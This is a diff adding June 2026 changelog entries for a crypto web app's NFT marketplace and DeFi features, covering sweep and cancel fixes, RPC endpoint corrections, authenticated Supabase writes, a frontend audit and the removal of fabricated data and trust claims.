+A separate five-surface perf audit contributed the biggest buy-path win: the bulk pre-check
+dropped its per-item Layer-3 Seaport `fulfillOrder.staticCall`
+(`validateOrderFillability` → `validateOrderQuick`, layers 1+2 only), so an N-item sweep no
+longer fires N full settlement simulations on the wallet RPC before the confirm screen —
+`handleConfirmSweep` still re-checks each item's price and freshness pre-broadcast, and
+Seaport reverts safely. The same commit raised the orderbook active-listings edge cache
+from `s-maxage=5`/`stale-while-revalidate=10` to `20`/`60`, because a 5s TTL gave a
+near-zero hit ratio on the most-hit read and went cold to Supabase's 2500ms deadline almost
+every load, and bounded `seaport-verify`'s `ethCallOnce` with a 2.5s per-attempt
+`AbortController` where it had previously been unbounded.
+
+**Two of that audit's five quick wins were skipped after verification rather than shipped**
+— the cart gas estimate is already fire-and-forget and does not gate the confirm button,
+and `placeholderData: (prev) => prev` would only have shown the previous collection's NFTs
+during a switch (same-collection refetch already retains data), which the commit judged a
+UX downgrade rather than a win. The commits record the full suite at 1094/1094 across 84
+files through this run.
+
+### Added — Twenty marketplace upgrades, two withdrawn on verification, three defects found by verifying the rest (2026-06-14)
+
+Five numbered batches, then a substitution pass, then an adversarial re-read of the whole
+range.
+
+- **Buying and sweeping (#1–#5).** A sweep no longer aborts the whole batch on one failed
+  item — the cheapest N listings are the most contested, so a stale or sniped middle order
+  is now skipped with a friendly toast and the rest proceeds, with only user-rejection or
+  insufficient funds stopping it and a "Swept X of Y" summary at the end.
+  `SweepCalculator` takes the EIP-5792 one-confirmation batch
+  (`fulfillSeaportOrdersBatch`) for all-Seaport sweeps of 2+, exactly like the cart,
+  falling back to the per-item loop when unsupported or native. `ListingCard` gained an
+  add-to-cart button next to Buy Now — the "add a few, sweep together" path every
+  marketplace has, replacing checkbox-plus-scroll-plus-Add-All. Clear Cart became a two-tap
+  confirm, having previously wiped a `localStorage`-persisted cart with no undo.
+- **Selling and offers (#6–#8).** Received Offers fetched offers for only the first 20
+  owned tokens, so a holder with 21+ NFTs could have a lucrative offer land on token #25
+  and never see it; it now fetches for all owned tokens at bounded concurrency 8, sorts
+  highest-value first so the best offer is not below the fold, and badges each offer with
+  its percentage of floor. **Cancel All popped one wallet signature per listing — 30
+  listings meant 30 prompts *after* the on-chain cancel had already succeeded** — because
+  Seaport's `incrementCounter()` invalidates every order atomically; partial closes left
+  dead listings still showing as active. It now signs one "Cancel all orders" message and
+  makes a single backend call, with the same chainId + timestamp replay protection as the
+  single-cancel path and scoped to the recovered signer, so a maker can only cancel their
+  own. The commit flags that this backend path is serverless-only and could not be
+  live-verified on the dev server.
+- **P2P trades (#9–#11).** Incoming trade offers now raise a toast rather than only a
+  silent nav badge — a swap proposal is the highest-intent, time-sensitive event on the
+  surface, with a 72h expiry — using the same rise-detection `useDmUnread` already had.
+  Expiry became a 1h/6h/1d/3d/7d picker (`createTradeOffer` already supported
+  `expirationHours` end to end; only the UI was missing). Countering a trade now carries
+  the original ETH/WETH cash legs across instead of silently zeroing them, carried by value
+  so the user reviews and signs before anything moves.
+- **Data accuracy (#12, #13, #16).** The order book displayed a BEST BID 4.38 ETH above a
+  0.10 floor and a **−4057% spread**; a collection bid at or above floor applies to any
+  token and would fill instantly, so it is stale or garbage — bids beyond 2× the floor are
+  now excluded from the spread, the best bid and the depth chart. Deals' FAIR VALUE was
+  inflated by sparse traits, where a single overpriced rare-trait listing became the trait
+  floor (the commit cites a 10 ETH fair value and "97% off" on a 0.10-floor collection); a
+  trait floor is now trusted only with three or more listings, so a token falls back to its
+  better-sampled traits — genuine grails still have multiple comps. The order-validation
+  banner is safety rather than an advanced tool, so it is no longer hidden in Lite mode,
+  where the beginners most likely to buy a sniped or expired listing are.
+- **Discovery and polish (#17–#20).** Gallery search became tokenized — each term must
+  match some field, AND across terms and OR across name/id/rank/traits — so "gold hat" and
+  "rank 50" work where a single substring returned empty for any multi-word query. Gallery
+  loads the full collection when a filter is active, mirroring TraitExplorer, so filtering
+  a 20k-token collection stops showing a near-empty misleading set until the user scrolls
+  for minutes. Native-buy failures route through `getFriendlyError` instead of leaking
+  "missing revert data" or a raw "…is not valid JSON". And the ~12s splash art now plays
+  once per browser session via `sessionStorage` — first entry still plays it in full, so
+  the art still greets a genuinely new visit.
+
+**Two of the twenty were verified not actionable and withdrawn rather than shipped.** #14
+(activity token IDs) was declined because `fetchActivity` already uses OpenSea's
+authoritative `nft.identifier`, and a supply filter would wrongly drop GNSS, whose IDs are
+non-sequential and exceed supply; #15 (a traits "sample" label) was declined because
+`TraitExplorer` already calls `loadAll` on visit and the sample is just the in-progress
+load. Two substitutes shipped in their place to keep the count honest: modal header tap
+targets raised from ~32px to the 44px iOS minimum — four ~32px actions in a 6px-gap row on
+a 375–390px phone were easy to mis-tap into an accidental modal close — and the
+`OrderBookPanel` 60s native-listings poll made visibility-gated, saving Vercel Hobby
+function budget and mobile battery and matching the Ticker and DM conventions.
+
+An adversarial verification of the whole `b58e538..HEAD` range then found three confirmed
+defects, fixed in the closing commit:
+
+- the counter-offer prefill carried `weth_topup` (maker-funded WETH offer) and `eth_topup`
+  (taker-paid ETH consideration) same-field while swapping the NFT sides. Both legs are
+  role-bound, so **a counter inverted the cash direction**; they are now swapped to match
+  the maker↔taker flip.
+- the `SweepCalculator` EIP-5792 batch path never advanced its progress counter and sat
+  frozen at 0/N for the whole confirmation; it now reads "Confirming sweep…".
+- a lone `rank` or `#` query in Gallery produced an empty terms array, hence no filter,
+  hence the whole collection; `rank` is now dropped only when it qualifies another term.
+
+### Added — One wallet confirmation for a multi-item cart, and a stale listing stopped being a dead end (2026-06-14)
+
+A multi-item cart sweep bought its items one at a time — a fresh preamble and a separate
+wallet confirmation per NFT. An all-OpenSea cart of 2+ items is now bought in **one**
+confirmation via `wallet_sendCalls` (EIP-5792), falling back to the sequential path with
+zero regression when the wallet does not support it.
+
+- `buildSeaportFulfillCall` was extracted as the build-without-send half of
+  `fulfillSeaportOrder`, carrying **every** security validation across — value bounds, the
+  Seaport-address allowlist and the fulfilment-function allowlist — and `fulfillSeaportOrder`
+  was rewired onto it with verbatim behaviour. `fulfillSeaportOrdersBatch` builds all calls
+  in parallel, submits through the existing `tryAtomicBatch` helper, and returns
+  `{unsupported}` so the cart can fall through. `ShoppingCart.handleConfirmSweep` re-checks
+  freshness and price upfront, then takes the batch fast path only when the cart is
+  all-Seaport with 2+ items; mixed and native carts fall through.
+- `tryAtomicBatch`'s `wallet_getCapabilities` probe was bounded with a 3s timeout —
+  **caught live, some wallets stall on it** — so a sweep can no longer freeze there and
+  falls back to sequential instead. The P2P trade path benefits from the same change.
+- Verified end to end with a connected wallet through the Chrome extension: a 2-item sweep
+  validated fast (both VALID), entered the batch path, and the 5792-capable wallet raised a
+  single `wallet_sendCalls` confirmation covering both NFTs. The user declined; the cart
+  unwound cleanly back to SWEEP ALL, no error, nothing spent.
+
+Two commits closed the stale-listing path the same live dive kept hitting. A sniped, sold
+or cancelled order that still lingers in OpenSea's best-listings feed reverts at gas
+estimation, and **the single-buy handler surfaced the raw ethers string "missing revert
+data"** — the cart already ran its messages through `getFriendlyError`; the single-buy path
+was the one leaking raw technical errors. `errorMessages.js` now maps
+missing-revert-data / CALL_EXCEPTION / cannot-estimate-gas to "This listing is no longer
+available — it was likely just sold or cancelled"; `fulfillSeaportOrder` returns a distinct
+`error: 'stale'`; `Listings.handleBuy` hides that token from the grid (reusing the
+`purchasedIds` filter) so it cannot be re-clicked; and the cart sweep drops it and keeps
+going. Verified on localhost: the stale-order buy shows the plain-language toast, with no
+wallet prompt and no funds moved.
+
+The same commit fixed the collection landing showing Volume "—" for the flagship.
+`fetchCollectionStats` only falls back to the cached figure on a *total* Alchemy failure,
+but the per-collection OpenSea volume call is the first thing throttled when the landing
+fans out stats for three collections at once. The main collection now falls back to
+`FALLBACK_STATS.volume` — the same number the detail hero shows — while other collections
+honestly stay null.
+
+### Added — Wash sales out of the aggregates, USD beside the ETH, net proceeds before you accept (2026-06-13 → 2026-06-14)
+
+Five additive, read-only features on the trading surface. Each is written so that a missing
+feed renders nothing rather than an invented number — the pattern the June audit kept
+asking for.
+
+- **`lib/washTrade.js`** flags a sale where the same wallet sits on both sides, comparing
+  full addresses case-insensitively and **only when both sides are present**, so it never
+  guesses on truncated display strings or partial data. Wired into the two existing
+  aggregation surfaces: `ActivityFeed` drops self-sales from the VOLUME and SALES figures
+  while still rendering the row with a "possible wash" badge, and the modal's
+  `PriceHistoryChart` drops them from the per-token sparkline, average and min/max. It
+  reuses address fields already on the fetched sale objects and invents no data. 11 unit
+  cases.
+- **USD alongside ETH** on the modal's current price, the cart total and the hero floor.
+  `useEthUsd` prefers the main app's Chainlink-backed `PriceContext` when the Naka tree
+  mounts inside it, and otherwise falls back to a single shared CoinGecko spot fetch that is
+  module-singleton, coalesced and visibility-gated, plausibility-clamped to $100–$100k like
+  the Chainlink validation in `useToweliPrice.ts`. **`formatUsd()` returns an empty string —
+  rendering nothing — for a null, zero or negative rate or a non-finite ETH amount**, so a
+  missing feed never paints an invented dollar figure; dust shows `<$0.01`. 14 unit cases,
+  including the no-real-rate honesty paths.
+- **A net-proceeds preview before accepting an offer.** Sellers previously learned their net
+  only from the wallet popup. `normalizeOffer` now surfaces `feeWei`, the sum of the order's
+  ERC20 consideration items (OpenSea fee, platform fee, any encoded royalty), left `null`
+  when no fee items exist so the preview falls back to an honest estimate rather than
+  claiming a zero-fee net. `netProceeds.js` has an EXACT tier computed from the order's own
+  consideration total, royalty-inclusive and clamped to `[0, gross]`, and an ESTIMATE tier
+  from the known `OPENSEA_FEE_BPS` + `PLATFORM_FEE_BPS` that discloses royalty is set by the
+  collection and not reflected. No transaction construction, approval or fulfilment path was
+  touched — display only. 14 unit cases.
+- **An incoming-trade nav badge.** `useIncomingTrades` mirrors `useDmUnread`: one poll a
+  minute of the existing public `fetchTrades({ role: "incoming", status: "active" })`, gated
+  on `document.hidden`, no auth and no new always-on loop. `fetchTrades` never throws, so a
+  dropped poll or a signed-out user degrades to no badge rather than an error. A pure
+  `countPendingIncoming()` filters to active *and* unexpired, because the orderbook's
+  "active" filter can still return rows the panel itself labels expired — so the badge
+  cannot over-count.
+- **ENS in the new-DM input.** The composer previously accepted only a raw `0x` address; it
+  now takes `name.eth` too, reusing the existing `ens_cache` with namespaced forward keys, a
+  30-minute TTL and cached-miss and concurrent-dedup behaviour. It resolves against the
+  shared read-only mainnet `FallbackProvider` via `getReadProvider` rather than the wallet,
+  so it works regardless of the connected chain, and **the live status surfaces the resolved
+  address next to the name — resolve, never auto-trust — so a lookalike name cannot quietly
+  stand in for an identity.**
+
+### Fixed — Community and token-lending writes were reachable while disconnected (2026-06-14)
+
+An adversarial rescan of the session's own changes returned 0 critical and 0 high, and
+reported the fund-movement paths and broad-engine areas clean. It found one medium and four
+lows.
+
+The medium was a regression introduced by the same session's logged-out work: the Community
+(Grants and Bounties) and token-lending write actions were gated on `chainId` + deployed
+rather than on `address`, and **`useChainId` returns the mainnet default when logged out** —
+so every write button was live for a disconnected visitor. It is **latent today**, because
+the zeroed address renders `FeatureNotDeployed`, but it would activate on deploy.
+`!address`/`!isConnected` gates were added to every write button and handler early-return,
+matching the pattern `NFTLendingSection` already used, and `handleCreate`'s address guard was
+moved *ahead* of the form clear so a disconnected submit cannot wipe what the user typed.
+
+The four lows, recorded because they are the kind of thing that otherwise disappears:
+
+- **a duplicate migration number** — `005_reaction_auth_hardening.sql`, added the previous
+  day, collided with the pre-existing `005_add_seaport_order_hash.sql` and was renamed to
+  `010_`.
+- `sendMessage`'s `token_id` coerced to `String` to satisfy the proxy's strict `z.string()`
+  schema.
+- the RPC proxy was untested; three tests were added pinning the F714 wallet-injection
+  invariant, taking that suite from 9 to 12.
+- `FarmPage`'s `pos.refetchAll()` moved above the no-receipt early return, so an untagged
+  confirmed write still refreshes the section.
+
+**Two display-only net-proceeds lows were declined**, on the grounds that they err in the
+conservative direction. Build green, lint clean, 1094/1094 tests across 84 files.
+
+### Fixed — The public RPC roster was rewritten six times in two days, and an `eth_chainId` trap is why (2026-06-13 → 2026-06-14)
+
+This is kept as a sequence rather than a conclusion, because each step was right about the
+endpoint it tested and wrong about one it inferred.
+
+1. **Drop merkle, add cloudflare.** wagmi's bare `http()` default resolves to
+   `eth.merkle.io`, which is **not** in the production CSP `connect-src` allowlist — so
+   every fall-through to it hard-blocked and spammed the console, the commit records at
+   200+ errors per 30 seconds on heavy routes. It was replaced with
+   `https://cloudflare-eth.com`, already allowlisted, and the same endpoint added to the
+   nakamigos ethers `FallbackProvider` list ahead of the down-since-2026-06-11 llamarpc.
+2. **Drop llamarpc from the wagmi fallback**, whose origin sends no
+   `Access-Control-Allow-Origin` header, so every fall-through failed CORS preflight with
+   `net::ERR_FAILED` and masked real failures. The same commit fixed an unrelated proxy
+   defect: the OpenSea allowlist accepted only the singular `collection/{slug}/stats` while
+   the client calls the canonical plural `collections/{slug}/stats`, **so the proxy 400'd
+   before ever reaching OpenSea and hub stat tiles were stuck as skeletons forever.**
+3. **Both Naka surfaces had hardcoded a single provider.** `OnChainProfile` and
+   `WhaleIntelligence` used `eth.llamarpc.com` as their *only* ethers JSON-RPC provider, so
+   they broke entirely when it returned 503/521 in production on 2026-06-11. Both were
+   routed through a new shared `getReadProvider()` `FallbackProvider` (quorum 1) over the
+   same endpoint list as `wagmi.ts`. Probing while doing so reported **three of the four
+   configured public RPCs permanently dead** — ankr now needs an API key, llamarpc 521 with
+   no CORS header, and cloudflare-eth recorded as a sunset gateway — and replaced them with
+   `eth.drpc.org` and `eth.merkle.io`.
+4. **A re-verification on 2026-06-13 corrected steps 2 and 3.** Every endpoint was probed
+   live with `curl eth_chainId` carrying an Origin header: publicnode, drpc and
+   cloudflare-eth all returned `0x1` with `access-control-allow-origin: *`, while merkle.io
+   returned Cloudflare error 1015 with no ACAO header and ankr returned `-32000
+   Unauthorized`. Both browser consumers (viem transports and the nakamigos ethers helper)
+   and the `vercel.json` CSP were set to exactly those three; a follow-up aligned the
+   `seaport-verify` server fallback to the same roster.
+5. **On 2026-06-14 that verification was itself corrected, and the commit names the method
+   error.** `cloudflare-eth` answers `eth_chainId` with `0x1` but returns `-32046`/`-32603`
+   on every **real** read — `eth_blockNumber`, `eth_call` — which the commit calls "the
+   `eth_chainId` trap that got it re-added twice". It was replaced with the live
+   `eth.merkle.io` in `seaport-verify` (server), `rpcProvider.js` (nakamigos ENS) and
+   `wagmi.ts` (main reads), merkle was allowlisted in the `vercel.json` CSP `connect-src`,
+   and every endpoint was re-verified with `eth_blockNumber` rather than `eth_chainId`.
+
+One more build-gate correction belongs here for the same reason. **`tsc -b` — what `npm
+build` and the deploy actually run — caught two errors `tsc --noEmit` had missed:**
+`useAddLiquidity` pinned `chainId` at the `useReadContracts` top level, which this wagmi
+version rejects (moved per-contract; all nine reads still target mainnet), and `AMMSection`
+read a `protocolFeeBps` view off the pool-factory ABI **which has no such function**. That
+second one reverts a change made hours earlier the same day, in the NFT-finance sweep, which
+had switched the AMM stats bar from a hardcoded 0.5% label to a live factory read; the label
+was restored and the live read deferred until the correct getter is identified.
+
+### Fixed — Three write paths that reverted or no-op'd every single time (2026-06-13)
+
+The first day of the June remediation opened on three defects that were not intermittent —
+each failed on every attempt, and one of them mined, burned gas and reported success.
+
+- **Every ERC20 sell reverted at gas estimation, because the approval named a different
+  contract than the swap called.** `useSwapAllowance` approved
+  `selectedRoute === 'tegridy' ? TegridyRouter : SwapFeeRouter`, while `useSwap` executes
+  `tegridy` → SwapFeeRouter, `uniswap` → UniswapV2Router, and aggregator → its on-chain
+  fallback venue. The user approved one contract and the swap called another, so
+  `transferFrom` reverted. `lib/swapRouting.ts:swapSpenderFor(selectedRoute, onChainSource)`
+  is now the single source of truth for the contract that pulls the user's tokens, mirroring
+  the `useSwap` executor addresses; `useSwapAllowance` reads allowance against both
+  `[SFR, UniswapV2Router]`, selects the active one by the resolved spender, and approves
+  that same spender, with `onChainSource` threaded through for the aggregator path.
+  `swapRouting.test.ts` asserts `spender === executor` for every route, and that it is never
+  the bare `TegridyRouter`.
+- **Every Cancel was a gas-burning no-op that reported success.** Four cloned cancel paths —
+  `api-offers.cancelOrder`, `BidManager.cancelBid`, `OrderBookPanel.handleCancel` and the
+  `MyListings` single-cancel — declared the cancel ABI with a trailing
+  `uint256 totalOriginalConsiderationItems` and passed the raw signed `OrderParameters`
+  straight in. Seaport's `cancel()` takes `OrderComponents`, whose trailing field is the
+  offerer's **live counter** — so the parameters' `totalOriginalConsiderationItems` landed in
+  the counter slot, Seaport hashed a phantom order, the transaction mined and returned true,
+  the UI toasted "cancelled" and optimistically removed the row, **and the real listing or
+  bid stayed fully fillable.** One shared `lib/seaportCancel.js` now reads
+  `getCounter(offerer)` and rebuilds `OrderComponents` with the live counter, mirroring the
+  already-correct `lib/trades.js cancelTradeOnChain` template; all four sites call it. The
+  legitimate `incrementCounter()` "Cancel All" path in `MyListings` was left untouched — it
+  is the correct bulk-invalidate mechanism.
+- **Every triggered DCA and limit order reverted, wasting gas.** Both keepers execute the
+  swap through `SwapFeeRouter` on the native Tegridy pool but computed `minOut` from
+  `getAmountsOut` on `UNISWAP_V2_ROUTER`; a Uniswap-priced `minOut` sent to the native pool
+  is mispriced and reverts on `InsufficientOutput`. Both now fetch the execute-time quote
+  from `TEGRIDY_ROUTER_ADDRESS` — the venue that actually executes — and apply the same
+  conservative fee haircut `useSwapQuote` uses,
+  `output * (10000 - MAX_FEE_BPS) / 10000`, before deriving `minOut`, so the fee cannot push
+  real output below it. `useDCA` also gained the 0-output guard `useLimitOrders` already had,
+  so an unseeded pool that cannot price the swap causes a skip rather than a `minOut = 0`
+  submission with no slippage protection. The limit-order trigger poller still tracks the
+  market price for the user's target condition; only the execute-time quote moved venues.
+  The commit records the residual: trigger and execution prices converge once the native pool
+  is seeded deep, and until then both keepers cleanly skip instead of reverting.
+
+> **The cancel fix's first test did not prove the cancel fix.** The commit that shipped
+> `seaportCancel.js` added `seaportCancel.test.js`, which asserts only *structural*
+> properties of `buildOrderComponents` — counter in the trailing slot, BigInt coercion,
+> field preservation. That is not the claim the fix rests on: Seaport derives the order hash
+> from the components you pass to `cancel()`, so a single misplaced field silently cancels a
+> phantom. A follow-up commit extended `api-offers.test.js` with the hash-level guard the
+> plan had called for: for a fixture OpenSea order and a fixture native order, build the
+> components and assert
+> `ethers.TypedDataEncoder.from(SEAPORT_ORDER_TYPES).hash(components)` equals the stored
+> `seaportOrderHash`. The golden hashes were derived **independently of
+> `buildOrderComponents`** — raw signed params plus the counter, the same path the wallet
+> signs — and each fixture's counter deliberately differs from its
+> `totalOriginalConsiderationItems`, so the pre-fix code hashes to a different value and
+> fails. A negative case asserts exactly that.
+
+### Fixed — Every cloud write from the marketplace was being rejected, and the interface reported success (2026-06-13)
+
+Three commits closed a family of failures with one shape: a Supabase write issued through
+the anon client, refused by RLS because the policies require the acting wallet to equal the
+wallet in a JWT that lives in an httpOnly cookie — followed by a UI that said it had worked.
+
+- **Chat.** Sending failed for everyone, likes were silent no-ops, and `toggle_reaction`
+  trusted a spoofable wallet argument. `/api/supabase-proxy` was extended to forward an
+  allowlisted set of RPCs (`toggle_like`, `toggle_reaction`) and **inject the JWT-verified
+  wallet into the arguments server-side, so a caller can never act as another wallet
+  regardless of what the function body does.** A new `lib/supabaseProxy.js`
+  (`proxyWrite`/`proxyRpc`/`firstRow`) generalises the DM proxy pattern; all three throw
+  `err.needsAuth` on a 401. `CommunityChat` gained a sign-in path it had never had — a
+  `runAuthed()` wrapper catches `needsAuth`, runs SIWE `signIn()`, and retries the action
+  once, so the flow is click → sign → send completes. Migration
+  `005_reaction_auth_hardening.sql` (an operator applies it in the Supabase SQL editor after
+  004) revokes anon `EXECUTE` on `toggle_reaction` and pins `search_path`, mirroring 004's
+  `toggle_like` hardening so the authenticated proxy is the only call path; no function body
+  was rewritten.
+- **Profile, favourites and watchlist.** All seven write operations — `saveProfile`,
+  add/remove favourite, add/remove watchlist and the two sync push-up paths — were routed
+  through `proxyWrite`, which attaches the cookie JWT server-side. Cross-device cloud sync
+  had been **silently degrading to this-device-only `localStorage`.** For a signed-out user
+  `proxyWrite` throws `needsAuth`, which is caught to keep the existing local fallback, so
+  there is no regression. Reads stay on the anon client (a public-read path); a proxy
+  `SELECT` for these tables is recorded as the remaining follow-up.
+- **The toast that lied.** `saveProfile()` always writes to `localStorage` first and then
+  returns `false` — *without throwing* — when the cloud upsert is rejected, so the
+  unconditional "Profile saved" toast fired on every failed cloud sync. It is now gated on
+  the real result: "Profile saved" only when the write synced, otherwise "Saved on this
+  device — sign in to sync across devices." The local save, and `onSave`/`onClose`, still
+  happen either way.
+
+The toast commit landed first and explicitly deferred the coordinated frontend + server + DB
+change as separately scoped; the other two shipped it the same day. The commits record
+1010 tests passing and the proxy suite still green at 9/9.
+
+### Added — A 690-finding frontend audit, the 838-item plan it produced, and the first five fixes out of it (2026-06-13)
+
+The audit was committed as an artefact — a live Chrome pass, Playwright viewports and a code
+read — **specifically so a concurrent tree-clean could not wipe it**:
+`AUDIT_REPORT_MAIN.md`, `AUDIT_REPORT_NAKA.md` and `AUDIT_REPORT_CROSS.md`;
+`REMEDIATION_PLAN.md` with `plan/g01..g14.md`; and the raw
+`AUDIT_FINDINGS_CONSOLIDATED.json` plus `plan_input/`. Every other 2026-06-13 entry in this
+file is sequenced out of that plan.
+
+The batch that went first — four tagged P0, the frozen-tween modals P1-B1:
+
+- **Two modals mounted invisible.** The Gallery `ArtLightbox` inner content wrapper and the
+  Swap `TokenSelectModal` card both set `initial={opacity: 0}` with an `animate` target that
+  omitted `opacity: 1`, so under `LazyMotion domAnimation` the entrance tween froze mid-fade
+  and the content simply never appeared. Adding `opacity: 1` to each target fixed both,
+  verified live. The commit also **reclassified a third finding rather than folding it in**:
+  F438 (the Liquidity/DCA/Alerts panes ghosted over art) is *not* this bug — the computed
+  pane opacity is 1 — it is a scrim-legibility problem against a late-loading mural, and it
+  was moved to the over-art batch.
+- **Home overflowed horizontally on iPhone** — 414px of content on a 390px device — because
+  the hero readability scrim uses negative `-left-6`/`-right-10` insets that extend past the
+  viewport. `overflow-x-clip` on the page root contains the decorative scrim (fixed elements
+  ignore ancestor overflow, so the fixed background and sticky nav are unaffected) and also
+  un-clips the nav menu. The Protocol-Active price pill sat behind the Towelie mascot — both
+  `fixed bottom-4 right-4`, mascot `z-60` over pill `z-40` — and moved to `right-24` on
+  `md+` with no mobile impact. `<MotionConfig reducedMotion="user">` was added around the
+  `LazyMotion` tree so every `m.*` animation honours the OS preference app-wide, without
+  per-component handling.
+- **Amount inputs turned `1e5` into `15`.** The staking and both LP inputs were `type=number`
+  with a `replace(/[^0-9.]/g,'')` strip that deletes the `e` and silently concatenates what
+  is left. A shared `sanitizeDecimalInput()` now *terminates* at scientific notation, so
+  `1e5` becomes a visibly-wrong `1`, and the inputs became `type=text inputMode=decimal` for
+  full control. In the same commit, `ReferralWidget` had one shared `copied` boolean for two
+  copy buttons, so clicking either flipped both to "Copied!" — the state is now keyed per
+  button.
+- **`MakeOfferModal` blanked itself on a partial price.** The price field fed
+  `e.target.value` straight into state, and two render-path IIFEs called `BigInt(whole)`
+  after `price.split('.')` — so typing or pasting `1e-8` threw on `BigInt('1e-8')` and a
+  leading-dot `.5` threw on `BigInt('')`, either of which took the modal out through the
+  ErrorBoundary. The main app's `sanitizeDecimalInput` was reused on the input and both
+  conversions guarded with `BigInt(whole || '0')`.
+- **Every live proposal and bounty read "Ends just now".** Grants and Bounties displayed
+  deadlines as `formatTimeAgo(deadline).replace(' ago', ' left')`; for a *future* timestamp
+  `formatTimeAgo` computes negative elapsed and returns "just now", so the replace never
+  matched anything. A dedicated `formatTimeUntil(timestamp)` was added — "5d left", "3h
+  left", "<1m left", "Ended" — and both call sites switched to it.
+
+Across the day's commits the frontend suite is recorded moving from 933 green to 998, 1006
+and then 1010; by 2026-06-14 the commits record 1094/1094 across 84 files.
+
+### Changed — The honesty sweep: fabricated whales, an unearned badge, and a partnership that did not exist (2026-06-13)
+
+The audit's largest single theme was surfaces asserting things the chain, the API or the
+project could not back. Seventeen commits corrected them.
+
+**Invented data**
+
+- The demo/fallback data shown when live endpoints are unavailable used **real, named
+  collectors** — vitalik.eth, pranksy.eth, punk6529.eth, dingaling.eth,
+  franklinisbored.eth — and perpetually-fresh timestamps. `FALLBACK_WHALES` now uses
+  obviously-synthetic `sample-whale-N.eth` handles and drops the fake "Xm ago" labels;
+  `FALLBACK_ACTIVITY` is anchored to a fixed past reference instead of `Date.now() - offset`,
+  so sample sales stop always rendering as "2 minutes ago" and masquerading as live trades.
+  Each row carries `sample: true`, and `fallbackHonesty.test.js` locks in both the synthetic
+  names and the non-fresh timestamps.
+- `usePoolTVL` stopped fabricating an "(est.)" volume and APR from an assumed turnover ratio
+  when no on-chain fees exist, rendering the existing "–" instead, and its synthetic 24h
+  volume fallback is now gated on `totalSwaps` so an unseeded pool produces no invented
+  turnover figure. `useFarmStats` distinguishes a real on-chain zero from a failed or
+  disabled TVL read, showing "–" rather than a confident "0 TOWELI"; the Treasury cards do
+  the inverse, showing explicit `$0.00`/`0 ETH` for a successful zero read and reserving "–"
+  for pending or failed ones.
+- Hardcoded `FALLBACK_STATS` on the Naka hero are now flagged `fallback: true` and marked
+  "cached" on floor, volume and owners instead of being presented as live.
+
+**Overstated trust prose**
+
+- A **fabricated Immunefi partnership claim and a 404 "Submit on Immunefi" link** were
+  removed, and the bounty tiers reframed as indicative severity bands paid as the treasury
+  allows.
+- The hardcoded "Verified on Etherscan" badge was dropped, because the sources are not yet
+  source-verified; the Etherscan link stays. The Contracts header softened from "all
+  contracts verified" to "source for every contract is linked below", and the Contracts page
+  meta from "verified on-chain" to "deployed on Ethereum mainnet".
+- Security and FAQ admin-control copy was aligned to the single-operator-key reality with the
+  multisig migration described as in progress, the treasury Safe link and an as-of stamp
+  added, and the security mascot tooltip softened from "audited and bug-bountied" to
+  "internally red-teamed".
+- Terms had its fee corrected to 0.5%, rendered from `SWAP_FEE_BPS` rather than typed, and
+  its DAO-governance claim dropped. "Wave 0" framing and a stale multisig address were
+  retired from the Contracts legend, doc and source links repointed at `/blob/mvp-launch`
+  (the deploy branch), a stale exact test-suite statistic replaced with a non-decaying
+  phrase, the Treasury row marked external (fixing a 404 `Treasury.sol` link), and "Last
+  reviewed: June 2026" stamps added to Security, Contracts and FAQ.
+
+**Fee and revenue copy reconciled with the chain**
+
+- Four marketing surfaces — footer, Lore, the onboarding modal and Contracts — asserted that
+  all protocol *revenue* was earmarked for stakers. Only the swap-fee line is, through the
+  governance-mutable `stakerShareBps`; the early-exit penalty and other revenue are
+  treasury-bound. The commit notes this was never contradictory with the Naka marketplace's
+  "every fee funds the treasury" line — that is a different product's 1% — but that the
+  Tegridy claim had to be made precise so the two did not read as a conflict. The static OG
+  and Twitter meta still carried the pre-honesty-pass version, **which crawlers republish
+  straight out of the static HTML**, and was corrected separately.
+- `useSwapQuote` now reads `SwapFeeRouter.feeBps()` live — one cacheable, mainnet-pinned
+  view, sanity-clamped to 0–1000bps — and feeds it into both the native-route netting and
+  the "(incl. X% fee)" disclosure, with the old constant kept as a no-read fallback. The Farm
+  Fee Share chip reads `stakerShareBps` live through the existing `usePoolTVL` multicall, and
+  a connect-prompt line that named a fixed hardcoded share was softened to wording that
+  cannot drift. The on-chain share sits at its maximum today, so this is drift-prevention
+  rather than a correction. A ProtocolStats card frozen at a hardcoded full share was
+  reworked to the hero's on-chain three-way framing.
+- **The chatbot and the swap UI disagreed about the fee.** Towelie answered "Swap fee is 0.3%
+  per trade" against the swap UI's 0.5% protocol-fee disclosure; the answer now names both —
+  the 0.5% `SwapFeeRouter` protocol fee and the 0.3% AMM pair fee that belongs to LPs.
+  `LivePoolCard` and the Risks page already distinguished them correctly.
+- Farm penalty copy now says the 25% early-exit goes to the treasury, matching the contract
+  and the card's own confirm dialog; it had previously named stakers as the recipient. The
+  boost-schedule rate was relabelled APR, because the maths is simple APR and not APY.
+- The Naka order book dropped its "Save 0.5% vs OpenSea" badge — OpenSea has been at ~1%
+  since September 2025, so that is parity and not a discount — reframed to "Flat 1% · fees
+  fund the treasury", and now discloses that creator royalties are not collected on native
+  fills. A stale "vs OpenSea 2.5%" comment in `orderbook.js` was corrected too.
+- The Learn page's dead "Claim Rewards" and "Daily Visit" earn-actions, which credit nothing,
+  were replaced with the real on-chain scoring formula and the streak-multiplier advertising
+  dropped; the leaderboard's not-connected state stopped asserting "No participants yet" as
+  fact in favour of "ranking goes live with the indexer".
+
+**Arithmetic that was quietly wrong**
+
+- `usePoolTVL` used **2025-03-01 as the pair-creation timestamp — about 15 months too early,
+  understating fee-APR and volume by roughly 100x.** `TEGRIDY_LP_CREATED_AT` and
+  `RELAUNCH_DEPLOY_BLOCK` (block 25,263,328, taken from the DeployMVP broadcast) were added
+  as constants and both were repointed. `usePoints` and `useTegridyScore` had been scanning
+  `eth_getLogs` from a stale `18,000,000n` — a ~7M-block span public RPCs reject — **silently
+  zeroing swap count and loyalty score.**
+- The Home yield calculator read `Number(poolData.apr)`; once APR reaches 10,000 the display
+  string is comma-formatted ("28,567") and `Number()` yields `NaN`, **silently flipping the
+  calculator to baseline while the hero pill showed the real rate.** It now reads the numeric
+  `aprNum`, with an explicit live-APR ceiling replacing a guard that was a no-op.
+- Portfolio realized P&L used FIFO with no time constraint, so a sell-then-rebuy matched
+  against the *later* rebuy as cost basis; a buy must now precede the sale in block order,
+  and sells with no known prior buy are excluded and surfaced as `realizedUnmatchedSells`
+  rather than counting full proceeds as profit. Gas is charged only against tokens with a
+  real purchase record, not mints and airdrops, and the stat relabelled "GAS (EST.)".
